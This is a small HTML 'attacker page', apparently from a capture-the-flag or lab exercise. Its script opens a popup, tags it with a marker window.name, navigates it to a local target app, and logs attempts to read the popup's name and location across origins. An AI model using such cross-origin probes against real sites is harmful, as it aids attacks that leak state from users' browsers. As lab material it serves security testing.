<!doctype html>
<html>
<body>
<script>
console.log("attacker page loaded");

const w = window.open("about:blank", "_blank");
if (!w) {
  console.log("popup blocked");
} else {
  console.log("popup opened");

  try {
    w.name = "ghost_marker_" + Math.random().toString(36).slice(2);
    console.log("name set to: " + w.name);
    console.log("initial popup location: " + w.location.href);
  } catch (e) {
    console.log("initial setup failed: " + e.message);
  }

  setTimeout(() => {
    console.log("navigating popup to ritual-app");
    w.location = "http://ritual-app:5000/";
  }, 1000);

  setTimeout(() => {
    try {
      console.log("after nav, popup.closed = " + w.closed);
      console.log("after nav, popup.name = " + w.name);
      console.log("after nav, popup.location read = " + w.location.href);
    } catch (e) {
      console.log("after nav read failed: " + e.message);
      try {
        console.log("after nav, popup.name fallback = " + w.name);
      } catch (e2) {
        console.log("popup.name fallback failed: " + e2.message);
      }
    }
  }, 2000);
}
</script>
</body>
</html>
